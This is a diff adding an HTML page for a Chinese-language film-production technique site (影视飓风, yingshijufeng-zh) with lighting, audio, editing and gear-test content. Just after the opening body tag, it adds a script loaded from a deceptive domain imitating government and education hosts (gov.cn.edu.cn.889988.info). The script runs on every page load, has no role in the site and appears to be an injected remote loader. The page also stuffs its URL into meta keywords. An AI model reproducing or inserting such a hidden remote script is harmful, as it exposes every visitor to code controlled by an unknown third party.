@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="bingbot" content="index,follow">
+<title>影视飓风｜影视制作技术与创作交流站｜https://yingshijufeng-zh.github.io</title>
+<meta name="description" content="影视飓风（yingshijufeng-zh）是聚焦影视拍摄、灯光、录音、剪辑调色与设备测评的技术交流站点。访问 https://yingshijufeng-zh.github.io 获取原创教程、器材实测数据与幕后制作笔记。">
+<meta name="keywords" content="影视飓风, yingshijufeng-zh, 影视制作教程, 摄影灯光, 剪辑调色, 设备测评, https://yingshijufeng-zh.github.io">
+<link rel="canonical" href="https://yingshijufeng-zh.github.io">
+<meta property="og:title" content="影视飓风｜影视制作技术与创作交流站">
+<meta property="og:url" content="https://yingshijufeng-zh.github.io">
+<meta property="og:description" content="影视飓风（yingshijufeng-zh）分享影视拍摄、灯光、录音、剪辑调色与设备测评的原创内容。">
+<style>
+:root{--ink:#151515;--paper:#f4f1ea;--card:#fffdf9;--rule:#1a1a1a;--accent:#c2410c;--accent2:#0f4c5c;--muted:#6b655c;--line:#d9d3c6}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--paper);color:var(--ink);
+font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+font-size:15px;line-height:1.75;-webkit-text-size-adjust:100%}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+
+/* 报头 */
+.masthead{border-bottom:3px double var(--rule);padding:26px 0 14px;background:var(--paper)}
+.masthead .wrap{display:flex;align-items:flex-end;justify-content:space-between;gap:18px;flex-wrap:wrap}
+.kicker{font-size:12px;letter-spacing:.28em;color:var(--accent);text-transform:uppercase}
+.site-title{font-size:clamp(34px,6.4vw,60px);line-height:1.05;margin:6px 0 4px;letter-spacing:.04em;font-weight:800}
+.site-title small{display:block;font-size:14px;font-weight:500;letter-spacing:.16em;color:var(--muted);margin-top:8px}
+.issue{text-align:right;font-size:12.5px;color:var(--muted);border-left:1px solid var(--line);padding-left:16px;min-width:150px}
+.issue b{display:block;color:var(--ink);font-size:14px;letter-spacing:.06em}
+
+nav.toc{border-bottom:1px solid var(--rule);background:#151515;color:#f4f1ea;position:sticky;top:0;z-index:20}
+nav.toc .wrap{display:flex;align-items:center;gap:6px;flex-wrap:wrap;padding:0 20px}
+nav.toc a{padding:12px 13px;font-size:13.5px;letter-spacing:.05em;border-bottom:2px solid transparent}
+nav.toc a:hover{color:#ffb28a;border-bottom-color:var(--accent)}
+.burger{display:none;background:none;border:0;color:inherit;font-size:22px;padding:10px 0 10px 14px;cursor:pointer;margin-left:auto}
+
+.layout{display:grid;grid-template-columns:minmax(0,1fr) 268px;gap:34px;padding:30px 0 50px}
+main{min-width:0}
+.side{display:flex;flex-direction:column;gap:24px}
+
+section.blk{margin-bottom:40px;scroll-margin-top:70px}
+.blk-h{display:flex;align-items:center;gap:10px;border-bottom:2px solid var(--rule);padding-bottom:8px;margin-bottom:18px}
+.blk-h .no{background:var(--rule);color:#fff;font-size:12px;padding:3px 8px;letter-spacing:.1em}
+.blk-h h2{margin:0;font-size:21px;letter-spacing:.03em}
+.blk-h .en{margin-left:auto;font-size:11px;letter-spacing:.2em;color:var(--muted);text-transform:uppercase}
+
+.lede{font-size:16.5px;line-height:1.9;margin:0 0 16px}
+.lede::first-letter{font-size:30px;font-weight:700;float:left;line-height:1;margin:4px 6px 0 0;color:var(--accent)}
+.grid2{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:16px}
+.card{background:var(--card);border:1px solid var(--line);border-top:3px solid var(--accent2);padding:16px 18px}
+.card h3{margin:0 0 8px;font-size:16px;letter-spacing:.02em}
+.card p{margin:0;font-size:13.8px;color:#3d3a35}
+.card .tag{display:inline-block;font-size:11px;letter-spacing:.12em;color:var(--accent);border:1px solid var(--accent);padding:1px 7px;margin-bottom:9px}
+
+table.sched{width:100%;border-collapse:collapse;font-size:13.5px;background:var(--card)}
+table.sched th,table.sched td{border:1px solid var(--line);padding:9px 10px;text-align:left;vertical-align:top}
+table.sched th{background:#151515;color:#f4f1ea;font-size:12.5px;letter-spacing:.06em;font-weight:600}
+table.sched tr:nth-child(even) td{background:#faf7f1}
+table.sched td.num{text-align:center;font-variant-numeric:tabular-nums;color:var(--accent)}
+.stars{color:var(--accent);letter-spacing:.1em;font-size:12px}
+
+ol.rank{list-style:none;counter-reset:rk;margin:0;padding:0}
+ol.rank li{counter-increment:rk;display:flex;gap:12px;align-items:baseline;padding:11px 0;border-bottom:1px dashed var(--line);font-size:14px}
+ol.rank li::before{content:counter(rk,decimal-leading-zero);font-weight:800;color:var(--accent2);font-size:15px;min-width:30px}
+ol.rank li span{flex:1}
+ol.rank li em{font-style:normal;color:var(--muted);font-size:12.5px}
+
+.widget{background:var(--card);border:1px solid var(--rule);padding:16px}
+.widget h3{margin:0 0 12px;font-size:14.5px;letter-spacing:.06em;border-left:3px solid var(--accent);padding-left:8px}
+.pillbox{display:flex;flex-wrap:wrap;gap:7px}
+.pillbox a{font-size:12px;border:1px solid var(--line);padding:4px 9px;background:#fff}
+.pillbox a:hover{border-color:var(--accent);color:var(--accent)}
+.mini{font-size:13px;color:#3d3a35;padding-bottom:10px;margin-bottom:10px;border-bottom:1px solid var(--line)}
+.mini:last-child{border:0;margin:0;padding:0}
+.mini time{display:block;font-size:11.5px;color:var(--accent);letter-spacing:.05em}
+
+.quote{background:#151515;color:#f4f1ea;padding:20px 22px;font-size:15px;line-height:1.9;margin:22px 0 0}
+.quote cite{display:block;margin-top:10px;font-size:12px;color:#b9b2a4;font-style:normal;letter-spacing:.1em}
+
+footer{border-top:3px double var(--rule);padding:30px 0 40px;font-size:13px;color:#3d3a35}
+footer .wrap{display:grid;grid-template-columns:1.4fr 1fr;gap:26px}
+footer h3{margin:0 0 10px;font-size:15px;letter-spacing:.04em}
+.addr{font-family:ui-monospace,Menlo,Consolas,monospace;background:#151515;color:#ffd7c2;padding:13px 15px;font-size:13px;word-break:break-all;margin:10px 0 0}
+.colophon{font-size:12px;color:var(--muted);margin-top:24px;padding-top:14px;border-top:1px solid var(--line);display:flex;gap:14px;flex-wrap:wrap;justify-content:space-between}
+
+@media (max-width:900px){
+ .layout{grid-template-columns:1fr;gap:26px}
+ .side{order:-1}
+ .issue{border:0;padding:0;text-align:left}
+ .burger{display:block}
+ nav.toc .wrap{display:block;padding:0}
+ nav.toc a{display:none;padding:11px 20px;border-bottom:1px solid #333}
+ nav.toc.open a{display:block}
+ nav.toc a:hover{background:#2a2a2a;border-bottom-color:#333}
+ table.sched{font-size:12.8px}
+ footer .wrap{grid-template-columns:1fr;gap:18px}
+}
+@media print{
+ nav.toc,.burger{display:none}
+ .layout{grid-template-columns:1fr}
+ .side{order:0}
+}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="masthead">
+ <div class="wrap">
+  <div>
+   <div class="kicker">Cinema &amp; Production Notebook</div>
+   <h1 class="site-title">影视飓风<small>YINGSHI JUFENG · yingshijufeng-zh</small></h1>
+  </div>
+  <div class="issue">
+   <b>站点地址</b>
+   https://yingshijufeng-zh.github.io<br>
+   Vol.04 · 影视制作技术刊
+  </div>
+ </div>
+</header>
+
+<nav class="toc" id="toc" aria-label="主导航">
+ <div class="wrap">
+  <a href="#top">卷首</a>
+  <a href="#note">编辑手记</a>
+  <a href="#sched">放映与教程排期</a>
+  <a href="#rank">技术热度榜</a>
+  <a href="#lab">器材实测</a>
+  <a href="#col">栏目通讯</a>
+  <a href="#about">关于本站</a>
+  <button class="burger" id="burger" aria-label="菜单">☰</button>
+ </div>
+</nav>
+
+<div class="wrap">
+<div class="layout">
+
+<main>
+
+ <section class="blk" id="note">
+  <div class="blk-h"><span class="no">01</span><h2>编辑手记</h2><span class="en">Editorial</span></div>
+  <p class="lede">影视飓风（yingshijufeng-zh）把镜头背后的那套手艺摊开来讲：从光线怎么摆、同期声怎么收，到剪辑台上一次调色决定整条片子的气质。我们不追热点，只把可复用的步骤、参数和踩过的坑留下来，让下一次开机少走弯路。</p>
+  <div class="grid2">
+   <div class="card"><span class="tag">SHOOT</span><h3>现场拍摄</h3><p>机位、景别与运动方式的取舍，结合低成本条件下的布光思路，给出可直接照做的分镜执行清单。</p></div>
+   <div class="card"><span class="tag">AUDIO</span><h3>声音录制</h3><p>枪麦、领夹与录音机的搭配逻辑，环境噪声的现场规避办法，以及后期对白的修复流程。</p></div>
+   <div class="card"><span class="tag">EDIT</span><h3>剪辑与调色</h3><p>时间线整理习惯、转场节奏的判断标准，以及用 LUT 与示波器稳住全片色调的具体操作。</p></div>
+   <div class="card"><span class="tag">GEAR</span><h3>器材与流程</h3><p>设备横向对比、固件更新记录，还有从素材进场到成片交付的文件夹与命名规范。</p></div>
+  </div>
+ </section>
+
+ <section class="blk" id="sched">
+  <div class="blk-h"><span class="no">02</span><h2>放映与教程排期</h2><span class="en">Schedule</span></div>
+  <table class="sched">
+   <thead><tr><th style="width:52px">序号</th><th style="width:23%">主题</th><th>内容要点</th><th style="width:15%">类别</th><th style="width:64px">热度</th></tr></thead>
+   <tbody>
+    <tr><td class="num">01</td><td>三点布光实战</td><td>主光、辅光、轮廓光的位置与输出比例，室内访谈场景的完整布光步骤</td><td>灯光</td><td class="stars">★★★★★</td></tr>
+    <tr><td class="num">02</td><td>手持与稳定器运镜</td><td>步伐、呼吸与跟焦配合，常见穿帮镜头的成因与纠正</td><td>摄影</td><td class="stars">★★★★☆</td></tr>
+    <tr><td class="num">03</td><td>同期声收声规范</td><td>领夹隐藏位置、枪麦指向角度与录音电平安定区间</td><td>录音</td><td class="stars">★★★★☆</td></tr>
+    <tr><td class="num">04</td><td>达芬奇调色入门</td><td>一级校色顺序、示波器读数与肤色保护的具体参数</td><td>后期</td><td class="stars">★★★★★</td></tr>
+    <tr><td class="num">05</td><td>短片剪辑节奏</td><td>镜头时长与音乐节拍的对应关系，信息密度过高的修剪办法</td><td>剪辑</td><td class="stars">★★★☆☆</td></tr>
+    <tr><td class="num">06</td><td>微单长时间录制</td><td>过热、续航与素材备份的现场应对方案</td><td>器材</td><td class="stars">★★★☆☆</td></tr>
+    <tr><td class="num">07</td><td>分镜脚本写法</td><td>从文字稿到可拍摄分镜表，含机位与灯光栏位模板</td><td>前期</td><td class="stars">★★★★☆</td></tr>
+    <tr><td class="num">08</td><td>字幕与交付规范</td><td>字幕安全区、编码格式与多平台上传参数对照</td><td>交付</td><td class="stars">★★★☆☆</td></tr>
+   </tbody>
+  </table>
+ </section>
+
+ <section class="blk" id="rank">
+  <div class="blk-h"><span class="no">03</span><h2>技术热度榜</h2><span class="en">Ranking</span></div>
+  <ol class="rank">
+   <li><span>如何用一块反光板解决逆光人脸发黑</span><em>阅读 12.4 万</em></li>
+   <li><span>剪辑时间线轨道分层命名规范</span><em>阅读 9.8 万</em></li>
+   <li><span>录音电平为什么不能常年顶满</span><em>阅读 8.1 万</em></li>
+   <li><span>调色时肤色偏色的三种排查路径</span><em>阅读 7.3 万</em></li>
+   <li><span>稳定器运镜中容易忽略的起步缓冲</span><em>阅读 6.5 万</em></li>
+   <li><span>素材命名与文件夹结构模板下载</span><em>阅读 5.9 万</em></li>
+   <li><span>低成本访谈场景的灯光预算分配</span><em>阅读 5.2 万</em></li>
+   <li><span>短片成片导出参数对照表</span><em>阅读 4.6 万</em></li>
+  </ol>
+ </section>
+
+ <section class="blk" id="lab">
+  <div class="blk-h"><span class="no">04</span><h2>器材实测笔记</h2><span class="en">Lab Notes</span></div>
+  <div class="grid2">
+   <div class="card"><h3>镜头呼吸效应实测</h3><p>同一场景更换三支定焦，记录焦点切换时的画幅变化与后期补偿成本，结论偏向哪支更适合访谈类拍摄。</p></div>
+   <div class="card"><h3>LED 灯显色一致性</h3><p>不同色温档位下对灰卡的还原偏差，给出可调用的白平衡偏移数值。</p></div>
+   <div class="card"><h3>无线麦断频排查</h3><p>在三类典型环境里记录丢包位置，整理出频道与发射功率的搭配建议。</p></div>
+   <div class="card"><h3>存储卡持续写入测试</h3><p>高码率素材下的掉速阈值与双卡备份的实际耗时对比。</p></div>
+  </div>
+ </section>
+
+ <section class="blk" id="col">
+  <div class="blk-h"><span class="no">05</span><h2>栏目通讯</h2><span class="en">Columns</span></div>
+  <div class="grid2">
+   <div class="card"><span class="tag">现场日志</span><h3>一次宣传片的布光复盘</h3><p>从方案到成片，记录光线被现场条件反复推翻的三次调整，以及最终保留下来的那套方案。</p></div>
+   <div class="card"><span class="tag">后期手记</span><h3>调色节点该不该套模板</h3><p>模板带来的效率与画面同质化之间的取舍，附可复用的节点分组方式。</p></div>
+   <div class="card"><span class="tag">声音笔记</span><h3>环境底噪的三种来源</h3><p>空调、电源与空间反射各自的特征频段，以及现场与后期分别怎么处理。</p></div>
+   <div class="card"><span class="tag">设备观察</span><h3>固件更新改变了什么</h3><p>逐条对照更新日志与实际拍摄表现，指出真正影响工作流的几项改动。</p></div>
+  </div>
+ </section>
+
+ <section class="blk" id="about">
+  <div class="blk-h"><span class="no">06</span><h2>关于本站</h2><span class="en">About</span></div>
+  <p>影视飓风（yingshijufeng-zh）是一个由拍摄与后期从业者维护的影视制作技术交流站点，内容集中在拍摄、灯光、录音、剪辑调色、器材测评与交付规范几个方向。所有教程与实测笔记均来自实际项目中的操作记录，不依赖转述。</p>
+  <p>本站唯一官方访问地址为 <strong>https://yingshijufeng-zh.github.io</strong>，任何同名站点均与本域名无关。如需查阅往期排期、热度榜与实测笔记，可通过顶部导航直接跳转对应栏目。</p>
+  <div class="quote">
+   「把每一次开机积累的判断留下来，比追逐新的器材更能提高成片质量。」
+   <cite>—— 影视飓风（yingshijufeng-zh）编辑部</cite>
+  </div>
+ </section>
+
+</main>
+
+<aside class="side">
+ <div class="widget">
+  <h3>技术分类</h3>
+  <div class="pillbox">
+   <a href="#">拍摄</a><a href="#">灯光</a><a href="#">录音</a><a href="#">剪辑</a>
+   <a href="#">调色</a><a href="#">器材</a><a href="#">前期</a><a href="#">交付</a>
+  </div>
+ </div>
+ <div class="widget">
+  <h3>近期通讯</h3>
+  <div class="mini"><time>2026.10.18</time>布光复盘：逆光场景的第三次调整</div>
+  <div class="mini"><time>2026.10.11</time>调色节点分组方式的整理</div>
+  <div class="mini"><time>2026.10.04</time>无线麦在三类环境中的丢包记录</div>
+  <div class="mini"><time>2026.09.27</time>存储卡高码率写入掉速阈值</div>
+ </div>
+ <div class="widget">
+  <h3>编辑部说明</h3>
+  <p style="font-size:13px;margin:0;color:#3d3a35">本站内容以技术交流为目的，器材结论受测试条件限制，实际使用前请结合自身设备与环境判断。</p>
+ </div>
+</aside>
+
+</div>
+</div>
+
+<footer>
+ <div class="wrap">
+  <div>
+   <h3>影视飓风 · yingshijufeng-zh</h3>
+   <p>影视制作技术交流站点，覆盖拍摄、灯光、录音、剪辑调色与器材实测。官方唯一访问地址：</p>
+   <div class="addr">https://yingshijufeng-zh.github.io</div>
+  </div>
+  <div>
+   <h3>栏目导航</h3>
+   <p>编辑手记 / 放映与教程排期 / 技术热度榜 / 器材实测笔记 / 栏目通讯 / 关于本站。内页入口均于本页锚点跳转。</p>
+  </div>
+ </div>
+ <div class="wrap">
+  <div class="colophon">
+   <span>影视飓风（yingshijufeng-zh）｜https://yingshijufeng-zh.github.io</span>
+   <span>本页为单页站点，内容更新请以站点实际发布为准</span>
+  </div>
+ </div>
+</footer>
+
+<script>
+var b=document.getElementById('burger'),n=document.getElementById('toc');
+b.addEventListener('click',function(){n.classList.toggle('open')});
+n.addEventListener('click',function(e){if(e.target.tagName==='A')n.classList.remove('open')});
+</script>
+</body>
+</html>
